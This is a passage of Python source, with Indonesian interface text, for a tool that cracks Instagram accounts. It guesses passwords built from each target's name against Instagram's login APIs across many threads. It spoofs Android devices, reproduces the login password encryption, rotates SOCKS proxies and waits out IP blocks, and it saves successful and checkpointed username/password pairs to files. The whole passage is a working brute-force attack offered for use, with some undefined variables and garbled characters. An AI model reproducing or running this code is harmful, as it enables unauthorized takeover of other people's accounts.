.0.15.395,78.0.0.11.104,8.1.0,8.1.0,8.1.0,8.1.0,8.2.0,8.2.0,8.2.0,8.2.0,8.5.0,8.5.0,8.5.0,8.5.1,80.0.0.14.110,82.0.0.13.119,83.0.0.20.111,84.0.0.21.105,85.0.0.21.100,86.0.0.19.87,86.0.0.24.87,88.0.0.14.99,9.0.0,9.0.0,9.0.0,9.1.5,9.1.5,9.2.0,9.2.0,9.2.0,9.2.0,9.2.0,9.2.5,9.2.5,9.2.5,90.0.0.18.110,91.0.0.18.118,92.0.0.15.114,93.1.0.19.102,94.0.0.22.116,95.0.0.21.124,96.0.0.28.114,99.0.0.32.182")
		igve=igv.split(",")
		andro=rc(["30/11","31/12","29/10"])
		versi=rc(igve)
		android_version = subprocess.check_output("getprop ro.build.version.release",shell=True).decode("utf-8").replace("\n","")
		model_device = subprocess.check_output("getprop ro.product.model",shell=True).decode("utf-8").replace("\n","")
		build_device = subprocess.check_output("getprop ro.build.id",shell=True).decode("utf-8").replace("\n","")
		versi_chrome = str(random.randint(300,325))+".0.0."+str(random.randint(1,8))+"."+str(random.randint(40,150))
		large_device = "{density=2.25,height="+subprocess.check_output("getprop ro.hwui.text_large_cache_height",shell=True).decode("utf-8").replace("\n","")+",width="+subprocess.check_output("getprop ro.hwui.text_large_cache_width",shell=True).decode("utf-8").replace("\n","")+"}"
		merk_device = subprocess.check_output("getprop ro.product.manufacturer",shell=True).decode("utf-8").replace("\n","")
		brand_device = subprocess.check_output("getprop ro.product.brand",shell=True).decode("utf-8").replace("\n","")
		cpu_device = subprocess.check_output("getprop ro.product.cpu.abilist",shell=True).decode("utf-8").replace(",",":").replace("\n","")
		versi_app = str(random.randint(111111111,999999999))
		language = "en_GB"
		try:
			simcard = subprocess.check_output("getprop gsm.operator.alpha",shell=True).decode("utf-8").split(",")[1].replace("\n","")
		except:
			simcard = subprocess.check_output("getprop gsm.operator.alpha",shell=True).decode("utf-8").split(",")[0].replace("\n","")
		uas=f"Instagram {versi} Android ({andro}; {dpi}dpi; {pxl}; {merk_device}; {brand_device}; {model_device}; {com}; {comi})"
		return uas
	def passwordAPI(self,xnx):
		print('\r')
		prints(Panel(f"{P2}Total Username Terkumpul : {H2}{len(internal)}",width=80,padding=(0,20),style=f"{color_table}"))
		self.ifo()
		u = input(f'• Pilih Methode : ')
		if u in ["1","01"]:
			method.append('satu')
		elif u in ["2","02"]:
			method.append('dua')
		elif u in ["3","03"]:
			method.append('tiga')
		elif u in ["4","04"]:
			method.append('empat')
		elif u in ["5","05"]:
			method.append('lima')
		elif u in ["6","06"]:
			method.append('enam')
		else:
			method.append('satu')
		prints(Panel(f"{P2}[{B2}01{P2}] Name,Name123,Name1234\n{P2}[{B2}02{P2}] Name,Name123,Name1234,Name12345\n{P2}[{B2}03{P2}] Name,Name123,Name1234,Name12345,Name123456\n{P2}[{B2}04{P2}] Name,Name123,Name1234 + Password Manual",title=f"[{P2} Pilihan Password[/] ]",width=80,padding=(0,4),style=f"{color_table}"))
		c=input(f'• Masukan Pilihan :{C} ')
		if c in ["01","1"]:
			self.generateAPI(xnx,c)
		elif c in ["2","02"]:
			self.generateAPI(xnx,c)
		elif c in ["3","03"]:
			self.generateAPI(xnx,c)
		elif c in ["4","04"]:
			prints(Panel(f"{P2}contoh password : sayang,anjing,bangsat",width=80,padding=(0,4),style=f"{color_table}"))
			zx=input(f'{N}• Tambahkan Password :{N} ')
			zz = zx.split(",")
			for i in zz:
				self.pwa.append(i)
			self.generateAPI(xnx,c,zx)		
		else:
			self.passwordAPI(xnx)
	def generateAPI(self,user,o,zx=''):
		self.ingfo()
		global prog,des
		prog = Progress(TextColumn('{task.description}'))
		des = prog.add_task('',total=len(user))
		with prog:
			with ThreadPoolExecutor(max_workers=30) as shinkai:
				for i in user:
					try:
						username=i.split("|")[0]
						password=clean(text=i.split("|")[1].lower(), no_emoji=True)
						for w in password.split(" "):
							if len(w)<3:
								continue
							else:
								w=w.lower()
								if o=="1":
									if len(w)==3 or len(w)==4 or len(w)==5:
										sandi=[w,w+'123',w+'1234']
									else:
										sandi=[w,w+'123',w+'1234']
								elif o=="2":
									if len(w)==3 or len(w)==4 or len(w)==5:
										sandi=[w,w+'123',w+'1234',w+'12345',password.lower()]
									else:
										sandi=[w+'123',w,w+'1234',w+'12345',password.lower()]
								elif o=="3":
									if len(w)==3 or len(w)==4 or len(w)==5:
										sandi=[w,w+'123',w+'1234',w+'321',w+'12345',w+'123456',password.lower()]
									else:
										sandi=[w,w+'123',w+'1234',w+'321',w+'12345',w+'123456',password.lower()]
								elif o=="4":
									for kontol in self.pwa:
										sandi=[w,w+'123',w+'1234']
										sandi.append(kontol)
								sandi.append(username.replace(".", "").replace("_", ""))
								sandi.append(username.replace(".", "").replace("_", "").replace("__", ""))
								sandi.append(username.replace(".", "").replace("_", "").replace("@", ""))
								sandi.append(w.replace(" ", ""))
								if 'satu' in method:
									shinkai.submit(self.V1,username,sandi)
								elif 'dua' in method:
									shinkai.submit(self.V2,username,sandi)
								elif 'tiga' in method:
									shinkai.submit(self.V3,username,sandi)
								elif 'empat' in method:
									shinkai.submit(self.V4,username,sandi)
								elif 'lima' in method:
									shinkai.submit(self.V5,username,sandi)
								elif 'enam' in method:
									shinkai.submit(self.V6,username,sandi)
								else:
									shinkai.submit(self.V1,username,sandi)
					except:
						pass
			print('\n')
			prints(Panel(f" {P2}Hasil {acakrich}{len(internal)} {P2}username selesai hasil Ok : {H2}{len(success)}{P2} Hasil Cp : {K2}{len(checkpoint)}{P2} ",width=80,padding=(0,8),style=f"{color_table}"))
		exit()
	def APIinfo(self,user):
		try:
			x=s.get("https://i.instagram.com/api/v1/users/web_profile_info/?username=%s"%(user),headers={"user-agent":USN,"x-ig-app-id":"936619743392459"})
			x_jason=x.json()["data"]["user"]
			nama=x_jason["full_name"]
			pengikut=x_jason["edge_followed_by"]["count"]
			mengikut=x_jason["edge_follow"]["count"]
			postingan=x_jason["edge_owner_to_timeline_media"]["count"]
		except:
			nama = "-"
			pengikut = "-"
			mengikut = "-"
			postingan = "-"
		return nama,pengikut,mengikut,postingan
	def encpwd(self,password):
		resp = ses.get("https://instagram.com/api/v1/web/accounts/login/ajax/")
		key_id = int(resp.headers.get("ig-set-password-encryption-web-key-id"))
		pub_key = resp.headers.get("ig-set-password-encryption-web-pub-key")
		version =resp.headers.get("ig-set-password-encryption-web-key-version")
		key = Random.get_random_bytes(64)
		iv = bytes([0] * 12)
		time = int(datetime.now().timestamp())
		aes = AES.new(key, AES.MODE_GCM, nonce=iv, mac_len=16)
		aes.update(str(time).encode('utf-8'))
		encrypted_password, cipher_tag = aes.encrypt_and_digest(
            password.encode('utf-8'))
		pub_key_bytes = binascii.unhexlify(pub_key)
		seal_box = SealedBox(PublicKey(pub_key_bytes))
		encrypted_key = seal_box.encrypt(key)
		encrypted = bytes([1,
                           key_id,
                           *list(struct.pack('<h', len(encrypted_key))),
                           *list(encrypted_key),
                           *list(cipher_tag),
                           *list(encrypted_password)])
		encrypted = base64.b64encode(encrypted).decode('utf-8')
		return f'#PWD_INSTAGRAM_BROWSER:{version}:{time}:{encrypted}'
	
	def enc_pw(self, pw, link):
		key_id = re.findall('{"key_id":"(.*?)"', str(link.replace("\\","")))[0]
		pub_key = re.findall('public_key\":\"(.*?)\",', str(link.replace("\\","")))[0]
		version = re.findall('version\":\"(\d+)\"}', str(link.replace("\\","")))[0]
		key = Random.get_random_bytes(64)
		iv = bytes([0] * 12)
		time = int(datetime.now().timestamp())
		aes = AES.new(key, AES.MODE_GCM, nonce=iv, mac_len=16)
		aes.update(str(time).encode('utf-8'))
		encrypted_password, cipher_tag = aes.encrypt_and_digest(pw.encode('utf-8'))
		pub_key_bytes = binascii.unhexlify(pub_key)
		seal_box = SealedBox(PublicKey(pub_key_bytes))
		encrypted_key = seal_box.encrypt(key)
		encrypted = bytes([1, int(key_id), *list(struct.pack('<h', len(encrypted_key))), *list(encrypted_key), *list(cipher_tag), *list(encrypted_password)])
		base = base64.b64encode(encrypted).decode('utf-8')
		return f"#PWD_INSTAGRAM_BROWSER:{version}:{time}:{base}"
	def V1(self,user,pas):
		global loop,success,checkpoint
		ses=requests.Session()
		logtemp=0
		guid = str(uuid.uuid4())
		ponid=str(uuid.uuid4())
		andro="android-%s" % hashlib.md5(str(time.time()).encode()).hexdigest()[:16]
		ig_sig=HARIS["ig_sig"]
		verig=HARIS["IGV"]
		igver=verig.split(",")
		igv=random.choice(igver)
		gedz=HARIS1["AOREC"][random.randrange(0,277)]["aorec"]
		ven1=gedz.split('|')[1]
		ven2=gedz.split('|')[2]
		giu1=HARIS["giu"]
		giu=giu1.split("||")
		ua=f'{giu[0]} {igv} {giu[1]} {ven1}; {ven2}; {giu[2]}'
		dat=HARIS["sinkz"]
		dat.update({"id": guid})
		data1=json.dumps(dat)
		ned=hmac.new(ig_sig.encode('utf-8'), str(data1).encode('utf=8'),hashlib.sha256).hexdigest()
		data2=HARIS["sinkz1"]
		data2.update({'signed_body': f'{ned}.{str(data1)}'})
		head=HARIS["headaing"]
		head.update({"user-agent": ua})
		while True:
				try:
					p=ses.post(HARIS["sinkz2"],headers=head,data=data2)
					break
				except:pass
		prog.update(des,description=f"[white]({acakrich}✔[white]) STABIL [{acakrich}{user}[/]] {str(loop)}/{len(internal)} [green]OK : -{len(success)}[/] [yellow]CP : -{len(checkpoint)}[/]")
		prog.advance(des)
		for pw in pas:
				try:
					data=json.dumps({"phone_id":ponid,"_csrftoken": ses.cookies["csrftoken"],"username":user,"guid":guid,"device_id":andro,"password": pw,"login_attempt_count": str(logtemp)})
					ned=hmac.new(ig_sig.encode('utf-8'), str(data).encode('utf=8'),hashlib.sha256).hexdigest()
					head2=HARIS["headaing1"]
					head2.update({"user-agent": ua})
					sianjing=HARIS["sianjing"]
					setan=sianjing.split("||")
					dataa=f'{setan[0]}{ned}{setan[1]}{ponid}{setan[2]}{ses.cookies["csrftoken"]}{setan[3]}{user}{setan[4]}{guid}{setan[5]}{andro}{setan[6]}{pw}{setan[7]}{logtemp}{setan[8]}'
					respon=ses.post(HARIS["crack"],headers=head2,data=dataa)
					try:
						ncek=json.loads(respon.text)
					except:
						ncek=respon.text
					logtemp+=1
					if "logged_in_user" in str(ncek):
						success.append(user)
						try:
							nama,pengikut,mengikut,postingan=self.APIinfo(user)
							print("")
							prints(Panel(f'\r[white][[green]✔[white]] Nama      : [green]{nama}\n[white][[green]✔[white]] Username  :[green] {user}\n[white][[green]✔[white]] Password  : [green]{pw}\n[white][[green]✔[white]] Pengikut  : [green]{pengikut}\n[white][[green]✔[white]] Mengikuti :[green] {mengikut}\n[white][[green]✔[white]] Postingan : [green]{postingan}',title=f"[green][ 𝐁𝐄𝐑𝐇𝐀𝐒𝐈𝐋 ][/green]",width=80,padding=(0,4),style="#9F9F9F"))
							print("")
							open(f"result/success/success-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
							open('.logCrack','a').write(f'{H}╭({H}{loop}{H}) {H}{user} {H}|| {H}{pw}\n{H}╰{H}{respon.text}\n')
							break
						except:
							print("")
							prints(Panel(f'\rUsername  : {H2}{user}                \n{P2}[{H2}✓{P2}] Password  : {H2}{pw}',title=f"{H2}LIVE",width=80,padding=(0,4),style=""))
							print("")
							open(f"result/success/success-{day}.txt","a").write(f'{user}|{pw}\n')
							open('.logCrack','a').write(f'{H}╭({H}{loop}{H}) {H}{user} {H}|| {H}{pw}\n{H}╰{H}{respon.text}\n')
							break
					elif 'https://i.instagram.com/challenge' in str(respon.text):
						nama,pengikut,mengikut,postingan=self.APIinfo(user)
						print("")
						prints(Panel(f'\r[white][[yellow]✘[white]] Nama      : [yellow]{nama}\n[white][[yellow]✘[white]] Username  :[yellow] {user}\n[white][[yellow]✘[white]] Password  : [yellow]{pw}\n[white][[yellow]✘[white]] Pengikut  : [yellow]{pengikut}\n[white][[yellow]✘[white]] Mengikuti :[yellow] {mengikut}\n[white][[yellow]✘[white]] Postingan : [yellow]{postingan}',title=f"[yellow][ 𝐆𝐀𝐆𝐀𝐋 ][/yellow]",width=80,padding=(0,4),style="#9F9F9F"))
						print("")
						open(f"result/checkpoint/checkpoint-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
						checkpoint.append(user)
						open('.logCrack','a').write(f'{K}╭({K}{loop}{K}) {K}{user} {K}|| {K}{pw}\n{K}╰{K}{respon.text}\n')
						break
					elif 'ip_block' in str(respon.text) or 'spam' in str(respon.text):
						prog.update(des,description=f"[red]SPAM[/] {str(loop)}/{len(internal)} [green]OK : -{len(success)}[/] [yellow]CP : -{len(checkpoint)}[/]")
						prog.advance(des)
						time.sleep(15)
						open('.logCrack','a').write(f'{M}╭({loop}) {user} || {pw}\n╰{respon.text}\n{N}\n')
						loop-=1
						break
					else:open('.logCrack','a').write(f'{N}╭({loop}) {user} || {pw}\n╰{respon.text}\n{N}\n')
				except requests.exceptions.ConnectionError:
					time.sleep(15)
					loop-=1
					break
				#except Exception as e:print(e)
		loop+=1
	def V2(self,user,pas):
		global loop,success,checkpoint
		ses=requests.Session()
		warna = random.choice([M, H, K, U, O,])
		logtemp=0
		guid = str(uuid.uuid4())
		ponid=str(uuid.uuid4())
		andro="android-%s" % hashlib.md5(str(time.time()).encode()).hexdigest()[:16]
		ig_sig=HARIS["ig_sig"]
		verig=HARIS["IGV"]
		igver=verig.split(",")
		igv=random.choice(igver)
		rr=random.randint
		ua=self.ua_v2()
		dat=HARIS["sinkz"]
		dat.update({"id": guid})
		data1=json.dumps(dat)
		ned=hmac.new(ig_sig.encode('utf-8'), str(data1).encode('utf=8'),hashlib.sha256).hexdigest()
		data2=HARIS["sinkz1"]
		data2.update({'signed_body': f'{ned}.{str(data1)}'})
		head=HARIS["headaing"]
		head.update({"user-agent": ua})
		while True:
				try:
					p=ses.post(HARIS["sinkz2"],headers=head,data=data2)
					break
				except:pass
		prog.update(des,description=f"[{acakrich}✓[/]] proses [{acakrich}{str(loop)}/{len(internal)}[/]] OK : -[bold green]{len(success)}[/] CP : -[bold yellow]{len(checkpoint)}[/]")
		prog.advance(des)
		for pw in pas:
				try:
					data=json.dumps({"phone_id":ponid,"_csrftoken": ses.cookies["csrftoken"],"username":user,"guid":guid,"device_id":andro,"password": pw,"login_attempt_count": str(logtemp)})
					ned=hmac.new(ig_sig.encode('utf-8'), str(data).encode('utf=8'),hashlib.sha256).hexdigest()
					head2=HARIS["headaing1"]
					head2.update({"user-agent": ua})
					pasw=pw.replace(' ','+')
					sianjing=HARIS["sianjing"]
					setan=sianjing.split("||")
					dataa=f'{setan[0]}{ned}{setan[1]}{ponid}{setan[2]}{ses.cookies["csrftoken"]}{setan[3]}{user}{setan[4]}{guid}{setan[5]}{andro}{setan[6]}{pw}{setan[7]}{logtemp}{setan[8]}'
					respon=ses.post(HARIS["crack"],headers=head2,data=dataa)
					try:
						ncek=json.loads(respon.text)
					except:
						ncek=(respon.text)
					logtemp+=1
					if "logged_in_user" in str(ncek) or "sessionid" in ses.cookies.get_dict() or "userId" in str(ncek):
						success.append(user)
						try:
							nama,pengikut,mengikut,postingan=self.APIinfo(user)
							print("\r                                       ")
							adit=f'\rNama      : {nama}\nUsername  : {user}\nPassword  : {pw}\nPengikut  : {pengikut}\nMengikuti : {mengikut}\nPostingan : {postingan}'
							pepekXD = nel(adit, style='#00FF00')
							print('\n')
							cetak(nel(pepekXD,style='',title='\r[bold green] 𝐋𝐈𝐕𝐄 [bold green]'))
							open(f"result/success/success-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
							open('.logCrack','a').write(f'{H}╭({H}{loop}{H}) {H}{user} {H}|| {H}{pw}\n{H}╰{H}{respon.text}\n')
							break
						except:
							print("")
							prints(Panel(f'\rUsername  : {H2}{user}                \n{P2}[{H2}✓{P2}] Password  : {H2}{pw}',title=f"{H2}LIVE",width=80,padding=(0,4),style=""))
							prints("")
							open(f"result/success/success-{day}.txt","a").write(f'{user}|{pw}\n')
							open('.logCrack','a').write(f'{H}╭({H}{loop}{H}) {H}{user} {H}|| {H}{pw}\n{H}╰{H}{respon.text}\n')
							break
					elif 'https://i.instagram.com/challenge' in str(respon.text):
						nama,pengikut,mengikut,postingan=self.APIinfo(user)
						print("\r                                       ")
						adit=f'\rNama      : {nama}\nUsername  : {user}\nPassword  : {pw}\nPengikut  : {pengikut}\nMengikuti : {mengikut}\nPostingan : {postingan}'
						pepekXD = nel(adit, style='#FFFF00')
						print('\n')
						cetak(nel(pepekXD,style='', title='\r[bold yellow] 𝐂𝐄𝐊𝐏𝐎𝐈N𝐓 [bold yellow]'))
						open(f"result/checkpoint/checkpoint-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
						checkpoint.append(user)
						open('.logCrack','a').write(f'{K}╭({K}{loop}{K}) {K}{user} {K}|| {K}{pw}\n{K}╰{K}{respon.text}\n')
						break
					elif 'ip_block' in str(respon.text) or 'spam' in str(respon.text):
						prog.update(des,description=f"{M2}[SPAM][/] {str(loop)}/{len(internal)} OK : -[bold green]{len(success)}[/] CP : -[bold yellow]{len(checkpoint)}[/]")
						prog.advance(des)
						time.sleep(15)
						open('.logCrack','a').write(f'{M}╭({loop}) {user} || {pw}\n╰{respon.text}\n{N}\n')
						loop-=1
						break
				except requests.exceptions.ConnectionError:
					time.sleep(15)
					loop-=1
					break
		loop+=1
	def ua_ig(self):
		rr=random.randint
		rc=random.choice
		return (f"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36")
		return (f"Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Mobile Safari/537.36")
		return (f"Mozilla/5.0 (Linux; Android 10; M2006C3LG Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.117 Mobile Safari/537.36 GoogleApp/14.25.13.28.arm")
		return (f"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36")
		return (f"Mozilla/5.0 (Linux; Android 12; V2111) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Mobile Safari/537.36")
		
	def V3(self,user,pas):
		global loop,success,checkpoint
		ses=requests.Session()
		logtemp=0
		if logtemp > 10:
			logtemp=0
		prx=random.choice(prox)
		xxx={"http": f"socks4://{prx}"}
		guid = str(uuid.uuid4())
		ponid=str(uuid.uuid4())
		andro="android-%s" % hashlib.md5(str(time.time()).encode()).hexdigest()[:16]
		ig_sig=HARIS["ig_sig"]
		verig=HARIS["IGV"]
		ua=self.ua_sendiri()
		dat=HARIS["sinkz"]
		dat.update({"id": guid})
		data1=json.dumps(dat)
		ned=hmac.new(ig_sig.encode('utf-8'), str(data1).encode('utf=8'),hashlib.sha256).hexdigest()
		data2=HARIS["sinkz1"]
		data2.update({'signed_body': f'{ned}.{str(data1)}'})
		head=HARIS["headaing"]
		head.update({"user-agent": ua})
		while True:
				try:
					p=ses.post(HARIS["sinkz2"],headers=head,data=data2)
					break
				except:pass
		prog.update(des,description=f"[{acakrich}crack[/]] {str(loop)}/{len(internal)} OK : -[bold green]{len(success)}[/] CP : -[bold yellow]{len(checkpoint)}[/]")
		prog.advance(des)
		for pw in pas:
				try:
					data=json.dumps({"phone_id":ponid,"_csrftoken": ses.cookies["csrftoken"],"username":user,"guid":guid,"device_id":andro,"password": pw.replace(' ','+'),"login_attempt_count": str(logtemp)})
					ned=hmac.new(ig_sig.encode('utf-8'), str(data).encode('utf=8'),hashlib.sha256).hexdigest()
					head2=HARIS["headaing1"]
					head2.update({"user-agent": ua})
					sianjing=HARIS["sianjing"]
					setan=sianjing.split("||")
					pasw=pw.replace(' ','+')
					dataa=f'{setan[0]}{ned}{setan[1]}{ponid}{setan[2]}{ses.cookies["csrftoken"]}{setan[3]}{user}{setan[4]}{guid}{setan[5]}{andro}{setan[6]}{pasw}{setan[7]}{logtemp}{setan[8]}'
					respon=ses.post(HARIS["crack"],headers=head2,data=dataa)
					try:
						ncek=json.loads(respon.text)
					except:
						ncek=respon.text
					logtemp+=1
					if "logged_in_user" in str(ncek):
						success.append(user)
						nama,pengikut,mengikut,postingan=self.APIinfo(user)
						try:
							print("")
							print(f'''\r
 {H}    [ 𝐋𝐈𝐕𝐄 ]
 {H}   • {N}Username  : {H}{user}
 {H}   • {N}Password  : {H}{pw}
 {H}   • {N}Pengikut  : {H}{pengikut}
 {H}   • {N}Mengikuti : {H}{mengikut}
 {H}   • {N}Postingan : {H}{postingan}''')
							print("")
							open(f"result/success/success-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
							open('.logCrack','a').write(f'{H}â•­({H}{loop}{H}) {H}{user} {H}|| {H}{pw}\n{H}â•°{H}{respon.text}\n')
							break
						except:
							prints(Panel(f'\r{P2}[{H2}âœ“{P2}] Nama      : {H2}{nama}                \n{P2}[{H2}âœ“{P2}] Username  : {H2}{user}                \n{P2}[{H2}âœ“{P2}] Password  : {H2}{pw}                \n{P2}[{H2}âœ“{P2}] Pengikut  : {H2}{pengikut}                \n{P2}[{H2}âœ“{P2}] Mengikuti : {H2}{mengikut}                \n{P2}[{H2}âœ“{P2}] Postingan : {H2}{postingan}',title=f"{H2}LIVE",width=80,padding=(0,4),style=""))
							print("")
							open(f"result/success/success-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
							break
					elif 'https://i.instagram.com/challenge' in str(respon.text):
						nama,pengikut,mengikut,postingan=self.APIinfo(user)
						print("")
						print(f'''\r
 {K}    [ 𝐂𝐄𝐊𝐏𝐎𝐈N𝐓 ]
 {K}   • {N}Username  : {K}{user}
 {K}   • {N}Password  : {K}{pw}
 {K}   • {N}Pengikut  : {K}{pengikut}
 {K}   • {N}Mengikuti : {K}{mengikut}
 {K}   • {N}Postingan : {K}{postingan}''')
						print("")
						open(f"result/checkpoint/checkpoint-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
						checkpoint.append(user)
						open('.logCrack','a').write(f'{K}â•­({K}{loop}{K}) {K}{user} {K}|| {K}{pw}\n{K}â•°{K}{respon.text}\n')
						break
					elif 'ip_block' in str(respon.text) or 'spam' in str(respon.text):
						prog.update(des,description=f"{M2}[SPAM][/] {str(loop)}/{len(internal)} OK : -[bold green]{len(success)}[/] CP : -[bold yellow]{len(checkpoint)}[/]")
						prog.advance(des)
						time.sleep(15)
						open('.logCrack','a').write(f'{M}╭({loop}) {user} || {pw}\n╰{respon.text}\n{N}\n')
						loop-=1
						break
					else:open('.logCrack','a').write(f'{N}╭({loop}) {user} || {pw}\n╰{respon.text}\n{N}\n')
				except requests.exceptions.ConnectionError:
					time.sleep(15)
					loop-=1
					break
				#except Exception as e:print(e)
		loop+=1
	def V4(self,user,pas):
		global loop,success,checkpoint
		ses=requests.Session()
		ua=self.ran()
		warna = random.choice([M, H, K, U, O,])
		prog.update(des,description=f"[{acakrich}ajax[/]] {str(loop)}/{len(internal)} OK : -[bold green]{len(success)}[/] CP : -[bold yellow]{len(checkpoint)}[/]")
		prog.advance(des)
		try:
			for pw in pas:
				ncek=random.randint(1000000000, 99999999999)
				prx=random.choice(prox)
				xxx={"http": f"socks5://{prx}"}
				p = ses.get("https://www.instagram.com/fxcal/auth/login/?app_id=1217981644879628&etoken=AbikEBmNhMsxlnCabkCq5bjspvbWU6_UCk0FCzhKplDHJnyXJFzjeLj1NoF95wRUvkfZ4TL3w5nB3KonV8Gu7eeenGJLOpZ0DT9lZfD2336OptE_6iHBRa_R&next=https%3A%2F%2Faccountscenter.instagram.com%2Fadd%2F%3Fauth_flow%3Dig_linking%26background_page%3D%252Faccounts%252F")
				head = {'X-IG-Connection-Speed': f'{rr(111,3700)}kbps', 'Accept': '*/*', 'X-IG-Connection-Type': rc(['MOBILE(LTE)', 'WIFI']), 'X-IG-App-ID': '124024574287414', 'Accept-Encoding': 'br, gzip, deflate', 'Accept-Language': 'id-ID', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'X-IG-ABR-Connection-Speed-KBPS': '0', 'Content-Length': f'{len(str(date))}', 'User-Agent': self.ua_ran(), 'Connection': 'keep-alive', 'X-IG-Capabilities': '36r/dw=='}
				data = {"jazoest": str(rr(11111,55555)),"phone_id": str(uuid.uuid4()),"_csrftoken": ses.cookies["csrftoken"],"enc_password": self.enc_pw(pw, link.text),"username": user,"adid": str(uuid.uuid4()),"guid": str(uuid.uuid4()),"device_id": "android-%s"%(hashlib.sha256(str(time.time()).encode()).hexdigest()[:16]),"google_tokens":"[]","login_attempt_count": logtemp}
				respon=ses.post("https://i.instagram.com/api/v1/accounts/login/", data=date, headers=head)
				haris=json.loads(respon.text)
				if "userId" in str(haris) or "sessionid" in ses.cookies.get_dict():
					success.append(user)
					nama,pengikut,mengikut,postingan=self.APIinfo(user)
					print("")
					prints(Panel(f'\r{P2}[{H2}✓{P2}] Nama      : {H2}{nama}                \n{P2}[{H2}✓{P2}] Username  : {H2}{user}                \n{P2}[{H2}✓{P2}] Password  : {H2}{pw}                \n{P2}[{H2}✓{P2}] Pengikut  : {H2}{pengikut}                \n{P2}[{H2}✓{P2}] Mengikuti : {H2}{mengikut}                \n{P2}[{H2}✓{P2}] Postingan : {H2}{postingan}',title=f"{H2}LIVE",width=80,padding=(0,4),style=""))
					print("")
					open('.logCrack','a').write(f'{H}╭({H}{loop}{H}) {H}{user} {H}|| {H}{pw}\n{H}╰{H}{respon.text}\n')
					open(f"result/success/success-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
					break
				elif "checkpoint_url" in str(haris):
					checkpoint.append(user)
					nama,pengikut,mengikut,postingan=self.APIinfo(user)
					print("")
					prints(Panel(f'\r{P2}[{K2}X{P2}] Nama      : {K2}{nama}                \n{P2}[{K2}X{P2}] Username  :{K2} {user}                \n{P2}[{K2}X{P2}] Password  :{K2} {pw}                \n{P2}[{K2}X{P2}] Pengikut  : {K2}{pengikut}                \n{P2}[{K2}X{P2}] Mengikuti : {K2}{mengikut}                \n{P2}[{K2}X{P2}] Postingan : {K2}{postingan}',title=f"{K2}CHECKPOINT",width=80,padding=(0,4),style=""))
					print("")
					open('.logCrack','a').write(f'{K}╭({K}{loop}{K}) {K}{user} {K}|| {K}{pw}\n{K}╰{K}{respon.text}\n')
					open(f"result/checkpoint/checkpoint-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
					break
				elif 'ip_block' in str(respon.text):
					prog.update(des,description=f"{M2}[SPAM][/] {str(loop)}/{len(internal)} OK : -[bold green]{len(success)}[/] CP : -[bold yellow]{len(checkpoint)}[/]")
					prog.advance(des)
					time.sleep(10)
				else:
					open('.logCrack','a').write(f'{N}╭({N}{loop}{N}) {N}{user} {N}|| {N}{pw}\n{N}╰{N}{respon.text}\n')
					continue
			loop+=1
		except requests.ConnectionError:
			time.sleep(10)
		#except Exception as e:prints(e)
	def V5(self,user,pas):
		global loop,success,checkpoint
		ses=requests.Session()
		rr=random.randint;rc=random.choice
		logtemp=0
		if logtemp > 10:logtemp=0
		prog.update(des,description=f"[{acakrich}{user}[/]] {str(loop)}/{len(internal)} OK : -[bold green]{len(success)}[/] CP : -[bold yellow]{len(checkpoint)}[/]")
		prog.advance(des)
		for pw in pas:
			try:
				link = ses.get("https://www.instagram.com/fxcal/auth/login/?app_id=1217981644879628&etoken=AbikEBmNhMsxlnCabkCq5bjspvbWU6_UCk0FCzhKplDHJnyXJFzjeLj1NoF95wRUvkfZ4TL3w5nB3KonV8Gu7eeenGJLOpZ0DT9lZfD2336OptE_6iHBRa_R&next=https%3A%2F%2Faccountscenter.instagram.com%2Fadd%2F%3Fauth_flow%3Dig_linking%26background_page%3D%252Faccounts%252F")
				data = {"jazoest": str(rr(11111,55555)),"phone_id": str(uuid.uuid4()),"_csrftoken": ses.cookies["csrftoken"],"enc_password": self.enc_pw(pw, link.text),"username": user,"adid": str(uuid.uuid4()),"guid": str(uuid.uuid4()),"device_id": "android-%s"%(hashlib.sha256(str(time.time()).encode()).hexdigest()[:16]),"google_tokens":"[]","login_attempt_count": logtemp}
				kode = hmac.new("a86109795736d73c9a94172cd9b736917d7d94ca61c9101164894b3f0d43bef4".encode('utf-8'), str(json.dumps(data)).encode('utf=8'),hashlib.sha256).hexdigest()
				date = f'signed_body={kode}.%7B%22jazoest%22%3A%22{data["jazoest"]}%22%2C%22phone_id%22%3A%22{str(uuid.uuid4())}%22%2C%22_csrftoken%22%3A%22{ses.cookies["csrftoken"]}%22%2C%22enc_password%22%3A%22%23PWD_INSTAGRAM{urllib.parse.quote(data["enc_password"].encode("utf8")).split("SER")[1]}%22%2C%22username%22%3A%22{user}%22%2C%22adid%22%3A%22{str(uuid.uuid4())}%22%2C%22guid%22%3A%22{str(uuid.uuid4())}%22%2C%22device_id%22%3A%22{"android-%s"%(hashlib.sha256(str(time.time()).encode()).hexdigest()[:16])}%22%2C%22google_tokens%22%3A%22%5B%5D%22%2C%22login_attempt_count%22%3A%22{logtemp}%22%7D'
